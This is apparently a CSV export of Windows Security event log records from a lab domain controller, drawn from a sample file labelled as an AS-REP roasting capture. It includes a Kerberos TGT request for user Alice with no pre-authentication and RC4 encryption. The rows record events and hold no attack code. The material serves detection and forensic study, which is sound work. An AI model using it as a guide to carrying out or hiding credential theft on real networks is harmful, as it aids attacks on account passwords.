5,37864,2021-04-29 07:56:26.4337289,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54634,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40800000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54634""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
6,37865,2021-04-29 07:56:26.4359310,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66373,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66373""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
7,37866,2021-04-29 07:56:26.4360541,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66373,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66373""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54633""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
8,37867,2021-04-29 07:56:26.6814878,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54636,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54636""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
9,37868,2021-04-29 07:56:26.6832020,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66389,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66389""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
10,37869,2021-04-29 07:56:26.6832968,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66389,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54635""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
11,37870,2021-04-29 07:56:26.8693445,4768,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos authentication ticket (TGT) was requested,,::ffff:192.168.1.2:54637,Target: labcorp.local\Alice,ServiceName: krbtgt,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-502,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,PreAuthType: Logon without Pre-Authentication.,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""labcorp.local""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""ServiceName"",""#text"":""krbtgt""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-502""},{""@Name"":""TicketOptions"",""#text"":""0x40800010""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""PreAuthType"",""#text"":""0""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54637""},{""@Name"":""CertIssuerName""},{""@Name"":""CertSerialNumber""},{""@Name"":""CertThumbprint""}]}}"
12,37871,2021-04-29 07:56:26.9808567,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\Bob,LogonType 3,LogonId: 0xC66389,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
13,37872,2021-04-29 07:57:22.9035761,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC6B108,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC6B108""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
14,37873,2021-04-29 07:57:22.9038623,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54371""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
15,37874,2021-04-29 07:57:22.9088466,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
16,37875,2021-04-29 07:58:02.6525054,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC712F1,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC712F1""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
17,37876,2021-04-29 07:58:02.6526651,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC712F1,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC712F1""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""b5ab5ccd-eca4-fc9c-3682-ee24b521fe72""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54374""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
18,37877,2021-04-29 07:58:02.6603670,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC713DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC713DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
19,37878,2021-04-29 07:58:02.6605822,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC713DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC713DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""c5279ba6-ad77-552e-9737-1974e1f4d01f""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,37879,2021-04-29 07:58:02.6665042,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7142B,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7142B""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
21,37880,2021-04-29 07:58:02.6666786,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.100)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7142B,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7142B""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""b5ab5ccd-eca4-fc9c-3682-ee24b521fe72""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.100""},{""@Name"":""IpPort"",""#text"":""54375""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
22,37881,2021-04-29 07:58:02.7617736,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC714D9,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC714D9""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
23,37882,2021-04-29 07:58:02.7618910,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC714D9,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC714D9""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""c5279ba6-ad77-552e-9737-1974e1f4d01f""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54376""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
